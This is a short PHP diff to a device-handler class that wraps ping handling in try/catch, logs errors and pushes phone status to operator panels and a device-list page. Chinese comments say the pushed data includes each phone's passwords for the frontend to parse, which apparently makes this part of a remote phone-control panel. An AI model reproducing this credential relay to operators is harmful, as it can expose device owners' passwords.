@@ -48,27 +48,37 @@ final class DeviceHandler
 
     private function handlePing(string $phoneId, array $data): void
     {
-        $this->heartbeatService->recordPing($phoneId);
+        try {
+            $this->heartbeatService->recordPing($phoneId);
 
-        $encodedData = $data['msg'] ?? '';
-        $status = $this->deviceStatusService->updateFromPing($phoneId, $encodedData);
+            $encodedData = $data['msg'] ?? '';
+            $status = $this->deviceStatusService->updateFromPing($phoneId, $encodedData);
 
-        $phoneInfo = $this->deviceStatusService->formatForPanel($phoneId);
+            $phoneInfo = $this->deviceStatusService->formatForPanel($phoneId);
 
-        // 格式化 lastPing 时间戳
-        $lastPing = null;
-        if (isset($phoneInfo['lastPing']) && $phoneInfo['lastPing'] > 0) {
-            $lastPing = date('Y-m-d H:i:s', (int) ($phoneInfo['lastPing'] / 1000));
+            // 格式化 lastPing 时间戳
+            $lastPing = null;
+            if (isset($phoneInfo['lastPing']) && $phoneInfo['lastPing'] > 0) {
+                $lastPing = date('Y-m-d H:i:s', (int) ($phoneInfo['lastPing'] / 1000));
+            }
+
+            // passwords 数据包含在 phoneInfo.phone_password 中，由前端解析
+            $this->connectionManager->sendToPanels($phoneId, [
+                'type' => 'statusBatch',
+                'pid' => $phoneId,
+                'serverToPhone' => 'OPEN',
+                'lastPing' => $lastPing,
+                'phoneInfo' => $phoneInfo,
+            ]);
+
+            // 同时推送给设备列表页（Index）的订阅者，用于实时更新电量、最后活动时间等
+            $this->connectionManager->notifyPanelUsersDeviceStatusUpdate($phoneId, $phoneInfo);
+        } catch (\Throwable $e) {
+            Log::channel('websocket')->error('Ping handling failed, connection preserved', [
+                'phone_id' => $phoneId,
+                'error' => $e->getMessage(),
+            ]);
         }
-
-        // passwords 数据包含在 phoneInfo.phone_password 中，由前端解析
-        $this->connectionManager->sendToPanels($phoneId, [
-            'type' => 'statusBatch',
-            'pid' => $phoneId,
-            'serverToPhone' => 'OPEN',
-            'lastPing' => $lastPing,
-            'phoneInfo' => $phoneInfo,
-        ]);
     }
 
     private function forwardToPanel(string $phoneId, array $data): void
